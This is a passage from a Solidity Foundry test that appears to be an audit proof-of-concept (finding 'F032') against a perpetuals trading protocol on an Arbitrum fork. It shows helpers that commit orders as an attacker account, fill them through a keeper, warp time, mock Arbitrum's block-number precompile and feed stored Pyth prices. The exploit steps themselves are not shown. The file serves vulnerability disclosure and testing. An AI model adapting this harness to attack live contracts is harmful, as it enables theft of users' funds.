            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Commit as the attacker, then a keeper fills it at the next tick (basket flat).
    function _trade(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        bool longSide = side == CfdTypes.Side.LONG;
        // LONG: open accepts price >= target, close accepts price <= target. SHORT: the opposite (OrderValidationLib).
        uint256 target = isClose ? (longSide ? type(uint256).max : 1) : (longSide ? 1 : type(uint256).max);
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("F032", ++orderNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: _bounds()
        });
        vm.prank(attacker);
        uint64 id = IPerpsTraderActions(ROUTER).commitOrder(req);
        uint64 t = cur;
        _advance(t + 3);
        vm.prank(keeper);
        r = keeperRouter.executeOrder{value: 2 * pythFee}(id, _payload(t + 1, t));
    }

    function _quantize(uint256 size) internal pure returns (uint256) {
        return size / 1e20 * 1e20;
    }

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - cur) + 1; // Arbitrum produces ~4 L2 blocks per second
        cur = timestamp;
        _syncClock();
    }

    function _syncClock() internal {
        vm.warp(cur);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF032.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    /// @dev Signed-update stand-in for a live tick at `tick`: the real stored price and confidence of each feed at
    ///      FORK_BLOCK, unchanged (the basket does not move during the PoC).
    function _payload(uint64 tick, uint64 prevTick) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: p.price, conf: p.conf, expo: p.expo, publishTime: tick, prevPublishTime: prevTick
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```
